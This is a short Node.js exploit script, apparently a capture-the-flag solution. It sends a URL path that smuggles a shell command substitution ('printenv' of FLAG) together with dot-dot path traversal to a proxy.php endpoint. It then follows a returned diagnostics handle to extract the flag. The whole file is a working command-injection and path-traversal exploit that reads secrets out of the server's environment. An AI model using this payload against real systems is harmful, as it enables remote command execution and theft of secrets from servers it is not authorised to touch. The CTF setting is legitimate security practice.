import http from 'node:http';

const target = new URL(process.env.CHALLENGE_URL ?? 'http://127.0.0.1:18083');
const injection = `/x$(printenv\${IFS}FLAG)x/%2e%2e/apps/builtin-code/proxy.php?status=1`;

function rawRequest(path) {
  return new Promise((resolve, reject) => {
    const request = http.request({
      hostname: target.hostname,
      port: target.port || 80,
      method: 'GET',
      path,
      headers: { Connection: 'close', Host: target.host },
      timeout: 3_000,
    }, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        body: Buffer.concat(chunks).toString('utf8'),
      }));
    });
    request.on('timeout', () => request.destroy(new Error('timeout')));
    request.on('error', reject);
    request.end();
  });
}

const trigger = await rawRequest(injection);
if (trigger.status !== 503) throw new Error(`unexpected trigger status ${trigger.status}: ${trigger.body}`);
const diagnostic = JSON.parse(trigger.body).diagnostic;
if (!/^\/diagnostics\/bootstrap\/[a-f0-9]{12}$/.test(diagnostic)) throw new Error('diagnostic handle missing');

const proof = await rawRequest(diagnostic);
const flag = /flag\{[^}\r\n]+\}/.exec(proof.body)?.[0];
if (proof.status !== 200 || !flag) throw new Error(`exploit failed (${proof.status}): ${proof.body}`);

console.log(flag);

